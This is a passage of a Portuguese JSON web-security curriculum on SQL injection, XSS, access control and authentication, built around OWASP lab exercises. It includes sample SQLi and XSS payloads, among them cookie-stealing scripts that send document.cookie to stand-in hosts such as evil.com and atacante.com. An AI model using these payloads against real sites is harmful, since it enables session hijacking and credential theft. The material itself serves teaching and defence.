                                  "verification": "Relatório de testes mostra 100% mitigação; cobertura de testes >80%.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "sqlmap, OWASP ZAP",
                                    "Frameworks de teste por linguagem"
                                  ],
                                  "tips": [
                                    "Automatize testes em CI/CD.",
                                    "Teste edge cases como empty strings, nulls."
                                  ],
                                  "learningObjective": "Validar efetividade das prevenções empiricamente.",
                                  "commonMistakes": [
                                    "Testar só payloads simples.",
                                    "Ignorar injeções em updates/deletes."
                                  ]
                                }
                              ],
                              "practicalExample": "Crie um app web de blog onde usuários postam comentários. Inicialmente vulnerável via query concatenada: $sql = \"SELECT * FROM posts WHERE id = $id\"; Demonstre SQLi com id=1 UNION SELECT user,pass FROM users. Aplique validação (int($id)), prepared stmt (SELECT ? FROM posts WHERE id=?), e stored proc sp_get_post(?). Teste com sqlmap confirmando proteção.",
                              "finalVerifications": [
                                "Nenhum payload de injeção altera comportamento da query.",
                                "Validação rejeita 100% de inputs inválidos.",
                                "Prepared statements e procs usados consistentemente em todas queries.",
                                "Testes automatizados passam em pipeline CI.",
                                "Logs capturam tentativas suspeitas.",
                                "Código auditado sem falsos positivos em scanners."
                              ],
                              "assessmentCriteria": [
                                "Validação cobre todos inputs com whitelisting contextual.",
                                "Prepared statements parametrizam corretamente sem concatenação.",
                                "Stored procs encapsulam lógica com privilégios mínimos.",
                                "Testes abrangem OWASP Top 10 injeções variadas.",
                                "Integração multiplataforma (PHP/Java/Node) funcional.",
                                "Documentação clara de defesas e trade-offs."
                              ],
                              "crossCurricularConnections": [
                                "Banco de Dados: Design de schemas e stored procedures.",
                                "Programação: Tratamento de exceções e logging.",
                                "Segurança da Informação: OWASP Top 10 e threat modeling.",
                                "Ética Profissional: Responsabilidade por dados sensíveis.",
                                "Qualidade de Software: Testes unitários e code review."
                              ],
                              "realWorldApplication": "Em e-commerces como Mercado Livre ou bancos como Nubank, previne breaches massivos como o Yahoo (2012) ou Equifax (2017), protegendo milhões de usuários contra roubo de credenciais, PII e escalada de privilégios via injeções."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.3.2",
                        "name": "Cross-Site Scripting (XSS)",
                        "description": "Exploração da vulnerabilidade XSS no OWASP Top 10, onde scripts maliciosos são injetados em páginas web visualizadas por outros usuários, dividida em reflected, stored e DOM-based.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.3.2.1",
                            "name": "Classificar tipos de XSS",
                            "description": "Diferenciar reflected XSS (via URL), stored XSS (em banco de dados) e DOM-based XSS, identificando vetores comuns como campos de formulário e comentários.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Reflected XSS",
                                  "subSteps": [
                                    "Leia a definição: Reflected XSS ocorre quando um payload malicioso é injetado via parâmetros de entrada (ex: URL query string) e imediatamente refletido na resposta do servidor sem sanitização.",
                                    "Analise o fluxo: Usuário envia input via GET/POST, servidor ecoa o input não sanitizado em HTML/JS da página.",
                                    "Identifique vetores comuns: Caixas de busca, mensagens de erro, parâmetros de URL como ?search=<script>alert(1)</script>.",
                                    "Teste conceitualmente: Simule com Burp Suite ou browser manipulando URL.",
                                    "Diferencie de outros: Não persiste, afeta apenas a vítima que clica no link malicioso."
                                  ],
                                  "verification": "Explique em suas palavras o fluxo de um ataque reflected XSS e dê um exemplo de URL vulnerável.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação OWASP XSS Prevention Cheat Sheet",
                                    "Browser com DevTools",
                                    "Exemplo de app vulnerável como DVWA"
                                  ],
                                  "tips": [
                                    "Use DevTools para inspecionar requests/responses",
                                    "Sempre URL-encode payloads para testes"
                                  ],
                                  "learningObjective": "Identificar e descrever precisamente o mecanismo de Reflected XSS e seus vetores típicos.",
                                  "commonMistakes": [
                                    "Confundir com stored achando que persiste",
                                    "Ignorar que requer interação da vítima via link"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compreender Stored XSS",
                                  "subSteps": [
                                    "Leia a definição: Stored XSS injeta payload em armazenamento persistente (DB, arquivos) e é servido a múltiplos usuários.",
                                    "Analise o fluxo: Input malicioso via formulário (ex: comentários), armazenado sem sanitização, renderizado como HTML para todos.",
                                    "Identifique vetores comuns: Campos de comentários, perfis de usuário, posts em fóruns, campos de bio.",
                                    "Simule: Imagine postando <script>alert(document.cookie)</script> em um comentário de blog.",
                                    "Diferencie: Persiste e afeta muitos usuários passivamente."
                                  ],
                                  "verification": "Descreva um cenário onde um comentário malicioso afeta visitantes subsequentes e liste 3 vetores.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "OWASP XSS Cheat Sheet",
                                    "Ferramenta como XSS Hunter",
                                    "Demo stored XSS em labs como PortSwigger"
                                  ],
                                  "tips": [
                                    "Priorize sanitização no armazenamento",
                                    "Teste com contas de admin vs user"
                                  ],
                                  "learningObjective": "Diferenciar Stored XSS de outros tipos focando em persistência e impacto amplo.",
                                  "commonMistakes": [
                                    "Achar que só afeta o autor do payload",
                                    "Subestimar risco em campos 'inofensivos' como comentários"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Compreender DOM-based XSS",
                                  "subSteps": [
                                    "Leia a definição: DOM-based XSS é puramente client-side, onde JS inseguro manipula DOM com input não confiável (ex: location.hash).",
                                    "Analise o fluxo: Payload chega via fragment (#) ou POSTDATA, JS usa innerHTML/document.write sem sanitizar.",
                                    "Identifique vetores comuns: location.search/hash, localStorage, postMessage sem validação.",
                                    "Exemplo: url#<script>alert(1)</script> onde JS faz eval(location.hash).",
                                    "Diferencie: Não envolve servidor, só client-side execution."
                                  ],
                                  "verification": "Forneça um snippet JS vulnerável a DOM-based XSS e explique como explorá-lo.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "PortSwigger DOM XSS Lab",
                                    "Chrome DevTools Sources tab",
                                    "Artigo MDN sobre DOM manipulation"
                                  ],
                                  "tips": [
                                    "Desabilite CSP para testes iniciais",
                                    "Use #payload para fragment identifiers"
                                  ],
                                  "learningObjective": "Reconhecer DOM-based XSS como ameaça client-side e listar vetores JS comuns.",
                                  "commonMistakes": [
                                    "Confundir com reflected server-side",
                                    "Ignorar inputs client-side como hash"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Classificar e Diferenciar Tipos de XSS",
                                  "subSteps": [
                                    "Compare tipos: Reflected (não-persistente, server-refletido), Stored (persistente, DB), DOM-based (client-side).",
                                    "Crie tabela comparativa: Colunas para fluxo, vetores, impacto, detecção.",
                                    "Identifique vetores híbridos: Formulários (stored/reflected), comentários (stored), URL/JS (DOM).",
                                    "Pratique classificação: Dado um cenário, classifique o tipo de XSS.",
                                    "Revise OWASP Top 10 para contexto."
                                  ],
                                  "verification": "Classifique 5 cenários hipotéticos (ex: busca URL, comentário blog) corretamente.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Tabela comparativa em papel ou Notion",
                                    "Quiz OWASP XSS",
                                    "Ferramentas como XSStrike"
                                  ],
                                  "tips": [
                                    "Use mnemônicos: Reflected=Reflexo imediato, Stored=Armazenado, DOM=Documento manipulado"
                                  ],
                                  "learningObjective": "Classificar qualquer vetor XSS em um dos 3 tipos com justificativa precisa.",
                                  "commonMistakes": [
                                    "Classificar DOM como reflected por envolver URL",
                                    "Esquecer impacto escalar do stored"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um fórum online, um atacante posta um comentário com '<script>document.location=\"http://evil.com/steal?cookie=\"+document.cookie</script>' (Stored XSS). Todos os visitantes executam o script roubando cookies. Reflected: Link phishing com ?error=<script>alert(1)</script> em página de erro. DOM-based: Site com JS 'eval(location.hash)' explorado via evil.com/page.html#<img src=x onerror=alert(1)>.",
                              "finalVerifications": [
                                "Liste e defina os 3 tipos de XSS com um vetor para cada.",
                                "Diferencie reflected de stored em termos de persistência e impacto.",
                                "Identifique DOM-based em um snippet JS fornecido.",
                                "Classifique corretamente 3 cenários mistos (ex: formulário de busca, comentário, hash URL).",
                                "Explique como vetores como campos de formulário podem levar a múltiplos tipos.",
                                "Descreva detecção básica para cada tipo (ex: Burp para reflected)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição e diferenciação dos 3 tipos (90%+ correto).",
                                "Identificação correta de vetores comuns para cada tipo.",
                                "Capacidade de classificar cenários reais ou hipotéticos sem erros.",
                                "Uso de exemplos concretos e técnicos (ex: payloads, fluxos).",
                                "Compreensão de impactos e diferenças chave (persistência, server vs client).",
                                "Clareza na tabela comparativa ou explicação escrita."
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento Web: HTML/JS sanitização (innerHTML, eval).",
                                "Bancos de Dados: SQL injection overlap em stored inputs.",
                                "Redes e Protocolos: HTTP parameters, URL encoding.",
                                "Segurança da Informação: OWASP Top 10, mitigações como CSP.",
                                "Programação: Análise de código client/server-side."
                              ],
                              "realWorldApplication": "Em e-commerces como brechas no MySpace (Samy Worm via stored XSS roubando perfis), redes sociais (comentários infectando feeds), ou apps single-page (DOM XSS via React/Vue manipulando state de URL), permitindo roubo de sessões, defacement ou phishing em massa."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.3.2.2",
                            "name": "Demonstrar exploits de XSS",
                            "description": "Criar payloads simples de XSS usando alert() ou roubo de cookies, testando em ambientes controlados como OWASP Juice Shop.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o Ambiente de Teste Controlado",
                                  "subSteps": [
                                    "Baixe o OWASP Juice Shop usando Docker: docker run --rm -p 3000:3000 bkimminich/juice-shop.",
                                    "Acesse http://localhost:3000 no navegador e crie uma conta de teste.",
                                    "Explore seções vulneráveis como busca, login ou comentários para identificar campos de entrada refletidos.",
                                    "Instale ferramentas auxiliares: Burp Suite Community ou navegador dev tools (F12).",
                                    "Verifique se o ambiente está isolado (use VM ou container para segurança)."
                                  ],
                                  "verification": "Juice Shop acessível em localhost:3000 sem erros e dev tools abertos.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Docker instalado",
                                    "OWASP Juice Shop (via Docker Hub)",
                                    "Navegador com dev tools"
                                  ],
                                  "tips": "Sempre use Docker para evitar impactos no sistema host; rode em modo incógnito para sessões limpas.",
                                  "learningObjective": "Preparar um ambiente seguro e isolado para testes éticos de vulnerabilidades.",
                                  "commonMistakes": [
                                    "Executar em ambiente de produção",
                                    "Ignorar isolamento de rede",
                                    "Não criar conta de teste"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Criar e Testar Payload Básico de XSS com alert()",
                                  "subSteps": [
                                    "Identifique um campo refletido, como a barra de busca na página inicial.",
                                    "Insira payload simples: <script>alert('XSS Teste')</script> e submeta.",
                                    "Observe o popup de alert() confirmando execução do script.",
                                    "Use dev tools (Console) para inspecionar se o payload foi injetado no HTML.",
                                    "Teste variações: <script>alert(document.domain)</script> para contexto."
                                  ],
                                  "verification": "Popup alert() aparece e exibe mensagem personalizada.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Navegador com dev tools",
                                    "OWASP Juice Shop rodando"
                                  ],
                                  "tips": "URL-encode payloads se necessário (ex: %3Cscript%3E); teste em diferentes campos.",
                                  "learningObjective": "Compreender execução de scripts injetados em contextos refletidos.",
                                  "commonMistakes": [
                                    "Esquecer tags <script>",
                                    "Não verificar saída HTML",
                                    "Testar em HTTPS sem ajustes"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Desenvolver Payload Avançado para Roubo de Cookies",
                                  "subSteps": [
                                    "Crie payload: <script>fetch('http://atacante.com/steal?cookie='+document.cookie)</script>.",
                                    "Configure um servidor mock local (ex: ngrok ou Python http.server) para receber dados.",
                                    "Injete no campo vulnerável e submeta; verifique recepção do cookie no servidor mock.",
                                    "Analise network tab no dev tools para capturar request de roubo.",
                                    "Teste com cookie de sessão real após login como usuário teste."
                                  ],
                                  "verification": "Cookie da sessão é enviado ao servidor mock controlado.",
                                  "estimatedTime": "20-25 minutos",
                                  "materials": [
                                    "Servidor mock (Python ou ngrok)",
                                    "Dev tools Network tab"
                                  ],
                                  "tips": "Use new Image() para exfiltração silenciosa: new Image().src='http://mock/steal?'+document.cookie.",
                                  "learningObjective": "Demonstrar impacto real de XSS via exfiltração de dados sensíveis.",
                                  "commonMistakes": [
                                    "CSP bloqueando fetch",
                                    "Não codificar cookie adequadamente",
                                    "Ignorar same-origin policy"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Documentar o Exploit e Verificar Impacto",
                                  "subSteps": [
                                    "Capture screenshots do alert(), network requests e cookies roubados.",
                                    "Escreva relatório: payload usado, passos, impacto (ex: roubo de sessão).",
                                    "Teste em múltiplos browsers (Chrome, Firefox) para consistência.",
                                    "Limpe dados: delete cookies, reinicie Juice Shop.",
                                    "Discuta mitigações brevemente (ex: Content-Security-Policy)."
                                  ],
                                  "verification": "Relatório completo com evidências e limpeza confirmada.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Ferramenta de screenshot",
                                    "Editor de texto para relatório"
                                  ],
                                  "tips": "Use templates OWASP para relatórios; sempre reporte vulnerabilidades eticamente.",
                                  "learningObjective": "Consolidar conhecimento documentando exploits de forma profissional.",
                                  "commonMistakes": [
                                    "Não capturar evidências",
                                    "Esquecer limpeza",
                                    "Discutir mitigações prematuramente"
                                  ]
                                }
                              ],
                              "practicalExample": "No OWASP Juice Shop, na barra de busca, injete '<script>document.location=\"http://seu-servidor/steal?cookie=\"+document.cookie</script>'. Ao submeter, o cookie de sessão é enviado ao seu servidor mock, simulando roubo em um e-commerce real.",
                              "finalVerifications": [
                                "Payload alert() executa popup em campo refletido.",
                                "Cookie de sessão é exfiltrado para servidor controlado.",
                                "Evidências capturadas em screenshots e network logs.",
                                "Exploit reproduzível em pelo menos dois browsers.",
                                "Ambiente limpo sem dados residuais.",
                                "Relatório explica mecanismo XSS e impacto."
                              ],
                              "assessmentCriteria": [
                                "Precisão dos payloads (sem erros de sintaxe).",
                                "Execução bem-sucedida em ambiente controlado.",
                                "Análise correta do impacto (ex: roubo de sessão).",
                                "Documentação clara com passos e evidências.",
                                "Adesão a práticas éticas (isolamento, limpeza).",
                                "Compreensão de contextos XSS (refletido vs. stored)."
                              ],
                              "crossCurricularConnections": [
                                "Programação Web (HTML, JavaScript DOM manipulation).",
                                "Ética e Direito em Cibersegurança (testes autorizados).",
                                "Desenvolvimento Seguro de Software (OWASP guidelines).",
                                "Análise de Redes (network interception com dev tools).",
                                "Engenharia de Software (relatórios de vulnerabilidades)."
                              ],
                              "realWorldApplication": "XSS é explorado em ataques reais para roubar sessões de usuários em sites como fóruns, e-commerces ou bancos, permitindo hijacking de contas; demonstrações éticas treinam devs para prevenir via sanitização de inputs e CSP."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.3.2.3",
                            "name": "Implementar defesas contra XSS",
                            "description": "Usar Content Security Policy (CSP), escape de saída com bibliotecas como OWASP ESAPI e validação de entrada para mitigar XSS.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Implementar Validação de Entrada",
                                  "subSteps": [
                                    "Identificar todos os pontos de entrada de dados do usuário na aplicação (formulários, APIs, queries).",
                                    "Definir regras de validação específicas para cada tipo de entrada (ex: email deve seguir padrão RFC, nomes sem tags HTML).",
                                    "Integrar bibliotecas de validação seguras como Joi (Node.js), Validator.js ou OWASP Java Encoder.",
                                    "Implementar rejeição de entradas inválidas com mensagens de erro claras e logging para auditoria.",
                                    "Aplicar sanitização básica em entradas aceitas para remover caracteres perigosos."
                                  ],
                                  "verification": "Testar entradas maliciosas como '<script>alert(1)</script>' e confirmar que são rejeitadas ou sanitizadas antes de processar.",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "Bibliotecas: Joi/Validator.js/OWASP ESAPI",
                                    "Documentação OWASP Input Validation Cheat Sheet",
                                    "Ambiente de desenvolvimento com app web de teste"
                                  ],
                                  "tips": "Valide sempre no lado do servidor; use whitelists em vez de blacklists para padrões permitidos.",
                                  "learningObjective": "Dominar técnicas de validação de entrada para bloquear payloads XSS na origem.",
                                  "commonMistakes": [
                                    "Confiar apenas em validação client-side (JavaScript).",
                                    "Permitir tags HTML benignas que podem ser exploradas em contextos diferentes.",
                                    "Não logar tentativas de injeção para monitoramento."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Escape de Saída com Bibliotecas Seguras",
                                  "subSteps": [
                                    "Identificar todos os pontos de saída de dados (HTML, JSON, CSS, JS, atributos HTML).",
                                    "Escolher e instalar biblioteca OWASP ESAPI ou equivalente (ex: DOMPurify para client-side, mas priorize server-side).",
                                    "Aplicar encoders contextuais: HTML escaping para body, JS escaping para scripts, URL encoding para links.",
                                    "Refatorar código existente para usar funções de escape em todas as renderizações de dados do usuário.",
                                    "Testar escapes em diferentes contextos de saída para garantir neutralização de payloads."
                                  ],
                                  "verification": "Inserir payload XSS via input e verificar se é renderizado como texto plano sem execução no output HTML.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "OWASP ESAPI library (Java/Node.js/Python)",
                                    "OWASP XSS Prevention Cheat Sheet",
                                    "Ferramentas como Burp Suite ou browser dev tools para inspecionar output"
                                  ],
                                  "tips": "Sempre escape baseado no contexto de saída; use bibliotecas testadas em vez de funções customizadas.",
                                  "learningObjective": "Aplicar escaping contextual para neutralizar scripts maliciosos em outputs dinâmicos.",
                                  "commonMistakes": [
                                    "Usar escape genérico HTML em contextos JS ou URL.",
                                    "Esquecer de escapar dados em respostas JSON ou atributos HTML.",
                                    "Reutilizar dados já escapados, causando double-encoding."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Content Security Policy (CSP)",
                                  "subSteps": [
                                    "Estudar diretivas CSP principais: default-src, script-src, style-src, img-src, object-src.",
                                    "Configurar CSP via meta tag HTML ou headers HTTP (preferencialmente headers com HttpOnly/Secure).",
                                    "Definir políticas restritivas: nonce para scripts inline, hash para estilos, bloqueio de eval() e inline scripts.",
                                    "Implementar CSP report-only mode inicialmente para monitorar violações sem bloquear.",
                                    "Ajustar políticas iterativamente baseado em reports e testes de funcionalidade."
                                  ],
                                  "verification": "Verificar headers CSP no browser dev tools e testar se scripts inline/não autorizados são bloqueados.",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "Documentação MDN Web Docs sobre CSP",
                                    "Ferramenta CSP Evaluator (csp-evaluator.withgoogle.com)",
                                    "Servidor web configurável (Apache/Nginx/Express.js)"
                                  ],
                                  "tips": "Comece restritivo e relaxe apenas o necessário; use nonces dinâmicos para scripts legítimos.",
                                  "learningObjective": "Configurar CSP para prevenir execução de scripts não autorizados mesmo se payloads passarem filtros.",
                                  "commonMistakes": [
                                    "Configurar CSP muito permissivo (ex: unsafe-inline).",
                                    "Esquecer de CSP em subdomínios ou APIs.",
                                    "Não testar com report-only, causando quebras inesperadas."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e Integrar Defesas Contra XSS",
                                  "subSteps": [
                                    "Criar payloads XSS variados (reflected, stored, DOM-based) usando cheat sheets OWASP.",
                                    "Executar testes automatizados com ferramentas como OWASP ZAP ou XSSer.",
                                    "Realizar code review para garantir cobertura de todos inputs/outputs.",
                                    "Simular ataques em ambiente staging e analisar logs/reports CSP.",
                                    "Documentar defesas implementadas e criar checklist para manutenção futura."
                                  ],
                                  "verification": "Nenhum payload XSS executa alert() ou rouba cookies em testes abrangentes.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "OWASP ZAP ou Burp Suite Community",
                                    "XSS Cheat Sheet (portswigger.net)",
                                    "Ambiente de teste isolado"
                                  ],
                                  "tips": "Automatize testes em CI/CD pipeline para regressões.",
                                  "learningObjective": "Validar integralmente as defesas para garantir mitigação efetiva de XSS.",
                                  "commonMistakes": [
                                    "Testar apenas payloads simples, ignorando variações obfuscadas.",
                                    "Não testar DOM-based XSS via client-side JS.",
                                    "Esquecer de testar após atualizações de código."
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma aplicação web de fórum (usando Node.js/Express e HTML), permita que usuários postem comentários. Inicialmente vulnerável, aplique validação em inputs de comentário, escape no render de HTML, e CSP para bloquear scripts inline. Teste injetando '<script>alert(\"XSS\")</script>' e confirme que não executa.",
                              "finalVerifications": [
                                "Payloads XSS reflected/stored/DOM-based não executam em inputs/outputs testados.",
                                "CSP headers/meta tags estão presentes e bloqueiam scripts não autorizados.",
                                "Logs registram e rejeitam entradas inválidas sem crashes.",
                                "Aplicação mantém funcionalidade normal (postar comentários legítimos).",
                                "Browser console mostra violações CSP reportadas corretamente.",
                                "Nenhum cookie/sessão é roubado em simulações de ataque."
                              ],
                              "assessmentCriteria": [
                                "Validação de entrada cobre 100% dos user inputs com regras whitelisting.",
                                "Escape contextual aplicado corretamente em todos outputs dinâmicos.",
                                "CSP configurado com políticas restritivas e modo report-only testado.",
                                "Testes abrangentes passam sem falsos positivos/negativos.",
                                "Código documentado com comentários sobre defesas XSS.",
                                "Integração sem quebrar features existentes."
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento Web: Integração com HTML/CSS/JS seguro.",
                                "Cibersegurança: Alinhamento com OWASP Top 10 e princípios de defense-in-depth.",
                                "Qualidade de Software: Testes automatizados e code review.",
                                "Ética em TI: Proteção de privacidade de usuários contra ataques.",
                                "Redes e Sistemas: Configuração de headers HTTP em servidores."
                              ],
                              "realWorldApplication": "Em e-commerces como Amazon ou bancos online como Nubank, previne roubo de sessões/cookies via comentários de produtos ou campos de busca, protegendo milhões de usuários contra phishing e malware distribuído por XSS."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.3.3",
                        "name": "Controle de Acesso Quebrado e Falhas de Autenticação",
                        "description": "Cobertura de A01:2021 Broken Access Control e A07:2021 Identification and Authentication Failures, envolvendo bypass de autorização e credenciais fracas.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.3.3.1",
                            "name": "Detectar falhas de controle de acesso",
                            "description": "Identificar violações como IDOR (Insecure Direct Object References) e falta de verificação de roles em APIs REST.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Fundamentais de Controle de Acesso e Vulnerabilidades",
                                  "subSteps": [
                                    "Estude definições de controle de acesso, autenticação e autorização.",
                                    "Aprenda sobre IDOR: como referências diretas a objetos inseguros permitem acesso não autorizado.",
                                    "Entenda falhas de verificação de roles: ausência de checks de permissão em endpoints de API.",
                                    "Revise OWASP Top 10 seção sobre Broken Access Control.",
                                    "Anote exemplos de impactos, como exposição de dados sensíveis."
                                  ],
                                  "verification": "Resuma em 3 frases os conceitos de IDOR e falha de roles, com exemplos hipotéticos.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação OWASP Broken Access Control",
                                    "Vídeos introdutórios no YouTube (OWASP channel)",
                                    "Notas pessoais"
                                  ],
                                  "tips": "Use diagramas para visualizar fluxos de autorização vs. autenticação.",
                                  "learningObjective": "Diferenciar e explicar IDOR e falhas de verificação de roles em APIs REST.",
                                  "commonMistakes": "Confundir autenticação (quem é o usuário) com autorização (o que pode fazer)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Falhas Estáticas no Código Fonte",
                                  "subSteps": [
                                    "Analise código de APIs REST em linguagens como Node.js, Python Flask ou Java Spring.",
                                    "Procure por parâmetros de ID em URLs/requests sem validação de ownership (ex: userId == loggedUserId).",
                                    "Verifique ausência de middlewares ou decorators de role check (ex: @roles_allowed('admin')).",
                                    "Use ferramentas como grep ou IDE search para padrões como 'req.params.id' sem checks.",
                                    "Documente 2-3 linhas de código vulneráveis encontradas."
                                  ],
                                  "verification": "Liste 3 trechos de código com falhas identificadas e explique por quê são vulneráveis.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Exemplos de código vulnerável no GitHub (OWASP repos)",
                                    "IDE como VS Code",
                                    "Documentação de frameworks REST"
                                  ],
                                  "tips": "Busque por funções como 'getUserById(id)' usadas diretamente sem contexto de usuário.",
                                  "learningObjective": "Detectar padrões de código que indicam IDOR ou falta de role verification.",
                                  "commonMistakes": "Ignorar fluxos condicionais que mascaram a falta de verificação."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Testar Dinamicamente Falhas em APIs com Ferramentas",
                                  "subSteps": [
                                    "Configure uma API vulnerável local (ex: Juice Shop OWASP ou DVWA).",
                                    "Use Postman ou Burp Suite para interceptar requests e alterar IDs/roles.",
                                    "Teste IDOR: logue como user A, mude ID para user B e veja se acessa dados.",
                                    "Teste role bypass: envie header role=admin sem autenticação adequada.",
                                    "Registre responses com payloads manipulados."
                                  ],
                                  "verification": "Capture screenshots de requests bem-sucedidos explorando falhas.",
                                  "estimatedTime": "90 minutos",
                                  "materials": [
                                    "Postman ou Burp Suite Community",
                                    "OWASP Juice Shop (Docker)",
                                    "Conta de teste em app vulnerável"
                                  ],
                                  "tips": "Sempre compare responses autorizados vs. não autorizados (deve retornar 403).",
                                  "learningObjective": "Executar testes dinâmicos para confirmar falhas de controle de acesso.",
                                  "commonMistakes": "Esquecer de autenticar primeiro ou usar IDs inválidos."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar e Documentar Descobertas",
                                  "subSteps": [
                                    "Classifique a severidade usando CVSS (ex: alta para IDOR com dados sensíveis).",
                                    "Escreva relatório com repro steps, impacto e sugestões de fix (ex: server-side checks).",
                                    "Compare com checklists OWASP para cobertura completa.",
                                    "Teste mitigações: adicione checks e reverifique.",
                                    "Discuta em fórum ou peer review."
                                  ],
                                  "verification": "Produza relatório de 1 página com achados e provas.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Template de relatório de vulnerabilidade",
                                    "CVSS calculator online",
                                    "OWASP Testing Guide"
                                  ],
                                  "tips": "Use Markdown para relatórios claros com imagens de Burp.",
                                  "learningObjective": "Documentar falhas de forma profissional para relatórios de segurança.",
                                  "commonMistakes": "Subestimar impacto ou omitir passos de reprodução."
                                }
                              ],
                              "practicalExample": "Em uma API de e-commerce, endpoint GET /orders/{orderId} permite que usuário A acesse orderId de usuário B alterando o parâmetro sem check de ownership, expondo dados de pagamento. Teste: Autentique como A, chame /orders/123 (de B), recebe dados sensíveis.",
                              "finalVerifications": [
                                "Explicar IDOR e role bypass com exemplos próprios.",
                                "Identificar falha em código fornecido em <2 minutos.",
                                "Executar teste dinâmico em lab e capturar prova.",
                                "Escrever relatório com repro steps e severidade.",
                                "Propor 2 fixes server-side para cada falha.",
                                "Diferenciar de outras vulnerabilidades OWASP."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de IDOR vs. role checks (90%+ acurácia).",
                                "Completude dos testes dinâmicos com evidências visuais.",
                                "Qualidade do relatório: claro, conciso e acionável.",
                                "Cobertura de substeps em todos os passos.",
                                "Criatividade em exemplos e conexões reais.",
                                "Tempo respeitado e eficiência demonstrada."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Análise estática de código em linguagens web.",
                                "Redes: Interceptação de tráfego HTTP/REST com proxies.",
                                "Ética: Implicações de privacidade e conformidade (GDPR).",
                                "Desenvolvimento Ágil: Integração de security em CI/CD.",
                                "Banco de Dados: Queries sem filtros de tenant."
                              ],
                              "realWorldApplication": "Em pentests de aplicações web, detectando breaches como o Capital One (IDOR expôs 100M registros), ou em DevSecOps para auditar APIs antes do deploy, prevenindo acessos indevidos em sistemas como bancos online ou SaaS."
                            },
                            "estimatedTime": "0.75 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.3.3.2",
                            "name": "Avaliar riscos de autenticação fraca",
                            "description": "Analisar senhas padrão, sessões sem timeout e falta de MFA, com exemplos de impactos como hijacking de contas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os conceitos fundamentais de autenticação fraca",
                                  "subSteps": [
                                    "Defina senha padrão como credenciais pré-configuradas (ex: 'admin/admin') que não são alteradas.",
                                    "Explique sessão sem timeout como cookies de sessão que não expiram automaticamente após inatividade.",
                                    "Descreva MFA (Autenticação Multi-Fator) e o risco de sua ausência, exigindo apenas senha.",
                                    "Liste exemplos iniciais de impactos: acesso não autorizado e roubo de identidade.",
                                    "Relacione com OWASP Top 10: Falhas de Autenticação Quebrada."
                                  ],
                                  "verification": "Crie um glossário com definições e um exemplo para cada conceito.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação OWASP Top 10 (seção A07:2021)",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Use analogias cotidianas, como comparar senha padrão a deixar a chave na porta.",
                                  "learningObjective": "Identificar e definir os três principais tipos de autenticação fraca.",
                                  "commonMistakes": [
                                    "Confundir senha padrão com senhas fracas genéricas.",
                                    "Ignorar que timeout é sobre inatividade, não expiração total."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar autenticação fraca em configurações e código de exemplo",
                                  "subSteps": [
                                    "Analise código-fonte ou config de um app web fictício para senhas hardcoded ou default.",
                                    "Verifique gerenciamento de sessões: procure por ausência de 'session.timeout' ou valores excessivos.",
                                    "Inspecione fluxos de login para ausência de prompts de MFA ou bibliotecas como TOTP.",
